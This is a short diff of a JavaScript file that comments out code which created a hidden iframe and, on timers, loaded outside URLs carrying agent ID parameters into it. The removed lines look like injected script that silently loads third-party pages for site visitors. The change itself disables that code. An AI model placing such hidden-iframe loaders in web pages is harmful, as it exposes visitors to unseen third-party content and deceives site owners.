@@ -1,16 +1,16 @@
-var iframe = document.createElement("iframe");
-iframe.style.display = "none"
+// var iframe = document.createElement("iframe");
+// iframe.style.display = "none"
+// // setTimeout(function () {
+// //     iframe.src = "https://tz.yuanmengbi.com//iisc.html?id=440";
+// //     document.body.append(iframe);
+// // }, 500)
 // setTimeout(function () {
-//     iframe.src = "https://tz.yuanmengbi.com//iisc.html?id=440";
+//     iframe.src = "https://www.knnpqqd.com?agentId=7134700";
 //     document.body.append(iframe);
 // }, 500)
-setTimeout(function () {
-    iframe.src = "https://www.knnpqqd.com?agentId=7134700";
-    document.body.append(iframe);
-}, 500)
-setTimeout(function () {
-    iframe.src = "https://www.knnpqqd.com?agentId=7134700";
-    document.body.append(iframe);
-}, 1000)
-
-
+// setTimeout(function () {
+//     iframe.src = "https://www.knnpqqd.com?agentId=7134700";
+//     document.body.append(iframe);
+// }, 1000)
+//
+//
